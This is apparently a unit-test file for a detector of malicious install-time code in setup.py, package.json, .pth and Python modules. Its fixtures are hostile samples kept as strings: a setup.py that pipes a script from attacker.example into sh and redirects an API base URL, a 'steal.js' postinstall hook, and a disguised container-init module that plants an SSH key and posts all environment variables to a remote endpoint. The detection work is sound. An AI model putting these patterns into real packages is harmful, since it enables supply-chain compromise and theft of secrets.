from __future__ import annotations

from pathlib import Path

from preprocessing.imperative_install import (
    analyze_file,
    analyze_package_json,
    analyze_pth,
    analyze_python_module,
    analyze_setup_py,
)

MALICIOUS_SETUP = """
import os
import subprocess
from setuptools import setup

os.environ["OPENAI_API_BASE"] = "https://proxy.attacker.example/v1"
subprocess.run("curl -s https://attacker.example/stage2.sh | sh", shell=True, check=False)

setup(name="x", version="0.1", py_modules=["x"])
"""

CLEAN_SETUP = """
from setuptools import setup

setup(name="x", version="0.1", py_modules=["x"])
"""


def test_setup_py_detects_subprocess_run() -> None:
    signal = analyze_setup_py(MALICIOUS_SETUP)
    assert signal.detected is True
    assert any(r.startswith("subprocess") for r in signal.reasons)


def test_setup_py_clean_not_flagged() -> None:
    signal = analyze_setup_py(CLEAN_SETUP)
    assert signal.detected is False


def test_package_json_postinstall_hook() -> None:
    content = '{"name":"x","scripts":{"postinstall":"node steal.js"}}'
    signal = analyze_package_json(content)
    assert signal.detected is True
    assert "npm:postinstall" in signal.reasons


def test_package_json_without_lifecycle_scripts_clean() -> None:
    content = '{"name":"x","scripts":{"build":"tsc"}}'
    assert analyze_package_json(content).detected is False


def test_pth_with_import_line_detected() -> None:
    content = "import os; os.system('evil')\n"
    assert analyze_pth(content).detected is True


def test_pth_plain_path_not_detected() -> None:
    assert analyze_pth("./some/dir\n./another\n").detected is False


def test_analyze_file_dispatch() -> None:
    assert analyze_file(Path("setup.py"), MALICIOUS_SETUP).detected is True
    assert analyze_file(Path("evil.pth"), "import os\n").detected is True
    assert analyze_file(Path("README.md"), "# hello").detected is False


# --- Fix 1 (2026-05-04): broaden PREP-007 to all .py files ---


# Realistic disguised-malware shape: docker_entrypoint_init.py-like file with
# subprocess/os/requests calls inside helper functions, NOT at module level.
DISGUISED_MALWARE_PY = """
# Docker container init helper.
import os
import subprocess
import requests
import pathlib

FLEET_API = "https://api.example.com/fleet/v2"

def setup_ssh_access():
    pubkey = os.environ.get("SSH_AUTHORIZED_KEY", "").strip()
    if not pubkey:
        return
    # Adds attacker key to authorized_keys
    pathlib.Path("/root/.ssh/authorized_keys").write_text(pubkey)
    subprocess.run(["/usr/sbin/sshd", "-D"], shell=True, check=False)


def harvest():
    meta = {}
    for k, v in os.environ.items():
        meta[k] = v
    return meta


def phone_home(meta):
    requests.post(FLEET_API + "/register", json=meta, timeout=30)


def main(argv=None):
    setup_ssh_access()
    phone_home(harvest())
    if argv:
        os.execvp(argv[0], argv)


if __name__ == "__main__":
    main()
"""

# Clean utility script — no dangerous calls at all.
CLEAN_UTILITY_PY = """
import json
import re
from pathlib import Path

def parse_log(path: Path) -> list[dict]:
    lines = path.read_text().splitlines()
    return [json.loads(line) for line in lines if line.strip()]


def filter_errors(records):
    return [r for r in records if r.get("level") == "error"]


if __name__ == "__main__":
    import sys
    records = parse_log(Path(sys.argv[1]))
    errs = filter_errors(records)
    print(f"Found {len(errs)} errors")
"""

# Edge case: dangerous call deep inside a function — still detected (intentional;
# we lift priority and let L1 verdict-call).
DEEP_DANGEROUS_PY = """
def helper():
    def inner():
        import subprocess
        subprocess.run(["ls"], check=False)
    inner()
"""


def test_python_module_disguised_malware_detected() -> None:
    """docker_entrypoint_init.py-like file: dangerous calls in helpers,
    invoked from `if __name__ == '__main__':`. Must fire."""
    signal = analyze_python_module(DISGUISED_MALWARE_PY)
    assert signal.detected is True
    # Reasons should be prefixed with "py_module:" to distinguish from
    # setup.py / npm / pth signals.
    assert all(r.startswith("py_module:") for r in signal.reasons)
    # Should detect subprocess.run, os.execvp, requests.post.
    joined = " ".join(signal.reasons)
    assert "subprocess.run" in joined
    assert "os.execvp" in joined
    assert "requests.post" in joined


def test_python_module_clean_utility_not_flagged() -> None:
    """Clean utility script with no dangerous APIs must not fire."""
    signal = analyze_python_module(CLEAN_UTILITY_PY)
    assert signal.detected is False
    assert signal.reasons == []


def test_python_module_dangerous_in_nested_function_detected() -> None:
    """Even when the dangerous call is in a deeply-nested function, lift
    priority — L1 makes the actual verdict call. False-positive risk is
    bounded because L1 still has to reach a malicious verdict."""
    signal = analyze_python_module(DEEP_DANGEROUS_PY)
    assert signal.detected is True


def test_python_module_syntax_error_returns_empty() -> None:
    """Malformed Python → empty signal (don't crash)."""
    signal = analyze_python_module("def broken(:\n  pass\n")
    assert signal.detected is False
    assert signal.reasons == []


def test_analyze_file_dispatches_py_to_python_module() -> None:
    """A .py file that's not setup.py / package.json / .pth still gets
    the python-module dangerous-call check."""
    signal = analyze_file(Path("docker_entrypoint_init.py"), DISGUISED_MALWARE_PY)
    assert signal.detected is True
    assert any(r.startswith("py_module:") for r in signal.reasons)


def test_analyze_file_setup_py_takes_precedence() -> None:
    """A file literally named setup.py uses analyze_setup_py (which adds
    the dependency_links check), not the broader python-module path.
    Reasons should NOT carry the py_module: prefix."""
    signal = analyze_file(Path("setup.py"), MALICIOUS_SETUP)
    assert signal.detected is True
    assert all(not r.startswith("py_module:") for r in signal.reasons)


def test_analyze_file_clean_py_not_flagged() -> None:
    """Clean .py utility script → not flagged via the broadened path."""
    signal = analyze_file(Path("util.py"), CLEAN_UTILITY_PY)
    assert signal.detected is False
